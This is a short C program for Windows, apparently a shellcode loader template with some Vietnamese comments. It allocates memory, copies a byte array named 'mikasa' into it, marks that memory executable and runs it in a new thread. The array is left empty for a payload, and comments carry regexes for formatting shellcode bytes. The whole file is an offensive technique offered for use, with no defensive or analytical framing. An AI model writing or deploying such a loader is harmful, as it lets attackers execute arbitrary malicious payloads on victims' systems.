#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <string.h>

unsigned char mikasa[] = "";

// .{180} 
// "$0"\n
// ^(?:"(?:\\x[0-9a-fA-F]{2})+"(?:\r?\n)?)+$

int main(){

    void *shellcode_memory;

    // khai bao memory luu tru shellcode
    shellcode_memory = VirtualAlloc(0, sizeof(mikasa), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy shellcode to memory
    RtlMoveMemory(shellcode_memory, mikasa, sizeof(mikasa));

    //change mem protect to execute
    DWORD oldprotect = 0;

    BOOL output = VirtualProtect(shellcode_memory, sizeof(mikasa), PAGE_EXECUTE_READ, &oldprotect);

    //create thread chay shellcode trong process
    if(output != 0){
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcode_memory, 0, 0, 0);
        WaitForSingleObject(hThread, -1); 
    }

    return 0;
}